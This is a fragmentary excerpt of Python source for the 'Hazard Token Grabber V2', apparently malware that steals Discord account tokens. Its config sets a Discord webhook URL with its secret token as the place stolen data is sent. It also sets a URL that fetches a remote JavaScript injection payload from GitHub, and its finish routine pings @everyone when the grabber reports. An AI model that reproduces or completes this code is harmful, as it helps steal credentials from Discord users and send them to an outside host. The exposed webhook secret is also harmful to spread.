...
__config__ = {
    ...
    'webhook2': "https://discord.com/api/webhooks/1040954665732419595/sQ48EyCGfVOilh0uHZnDiov-Ev9f14lXG_DmDTCcvezXXwHB11Lpx2mfTx2huz1o0Otu",
    # ONLY HAVE THE BASE32 ENCODED KEY HERE IF YOU'RE USING https://github.com/Rdimo/Discord-Webhook-Protector
    'webhook_protector_key': "KEY_HERE",
    # keep it as it is unless you want to have a custom one
    'injection_url': "https://raw.githubusercontent.com/your-bestie/Discord-Injection/master/injection.js",
...
class HazardTokenGrabberV2(Functions):
    def __init__(self):
        ...
        self.webhook2 = self.fetch_conf('webhook2')
...
{line_sep}
    ...
    def finish(self):
        ...
        if self.fetch_conf('ping_on_run'):
            embed2.update({'content': '@everyone'})
